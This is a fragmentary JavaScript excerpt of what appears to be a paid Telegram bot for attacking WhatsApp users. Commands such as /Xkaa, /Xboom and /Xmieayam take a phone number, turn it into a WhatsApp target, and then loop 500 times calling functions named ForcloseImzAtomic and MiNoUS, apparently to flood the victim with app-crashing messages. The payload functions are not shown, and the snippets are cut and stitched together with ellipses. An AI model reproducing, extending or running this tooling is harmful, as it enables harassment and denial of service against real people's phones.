...
bot.command("Xkaa", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Xkaa 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
...
bot.command("Xboom", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Xboom 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
...
ﾒ.- Status: Process`,
  ...
  for (let i = 0; i < 500; i++) {
    await ForcloseImzAtomic(sock, target);
    await sleep(400);
    await MiNoUS(sock, target);
    await sleep(400);
  }
...
bot.command("fcsran", checkWhatsAppConnection, checkPremium, checkCooldown, async ctx => {
...
bot.command("Xmieayam", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Xmieayam 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
